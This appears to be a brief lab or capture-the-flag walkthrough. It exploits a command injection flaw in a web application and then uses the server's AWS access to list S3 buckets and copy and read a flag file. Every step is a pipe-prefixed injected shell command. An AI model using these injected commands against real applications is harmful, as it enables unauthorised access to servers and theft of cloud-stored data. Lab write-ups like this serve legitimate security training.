1. Acccess and exploit given web application with command injection vulnerability

    ```bash
    | ls
    ```

2. Enumerate through S3 buckets accessible by web application's hosting server
   - Look for bucket which has `cmd` in it's name 
    ```bash
    | aws s3 ls | grep cmd
    ```

3. List files in S3 bucket found above

    ```bash
    | aws s3 ls cr-cmdinj-bucket-s3bucket
    ```

4. Copy found `txt` file to web application's server
   
    ```bash
    | aws s3 cp s3://cr-cmdinj-bucket-s3bucket/flag.txt ./flag.txt
    ```
5. Show what is inside `flag.txt`
    ```bash
    | cat ./flag.txt
    ```
